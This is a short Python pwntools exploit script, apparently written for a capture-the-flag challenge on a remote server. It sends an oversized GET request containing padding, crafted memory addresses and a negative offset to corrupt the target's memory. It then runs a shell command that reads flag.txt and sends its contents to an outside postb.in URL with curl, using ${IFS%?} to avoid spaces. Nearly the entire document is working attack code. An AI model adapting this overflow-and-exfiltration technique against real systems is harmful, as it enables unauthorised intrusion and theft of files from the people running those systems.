from pwn import *
import struct

p = remote("shell.actf.co", 19303)

p.sendline("GET " + "A"*2048 + p64(0x402828 + 4*8) + struct.pack('<q', -(56 + 9)) + p64(0x402828+4*8) + p64(0x402828+8+4*8) + p64(0x402828+11+4*8) + p64(0x402820 + 4*8) + "\x00\x00\x00\x00\x00\x00\x00\x00/bin/sh\x00-c\x00curl${IFS%?}https://postb.in/AYhnjs3O?f=$(cat${IFS%?}flag.txt)\x00 ")

while True:
	print(p.recv())
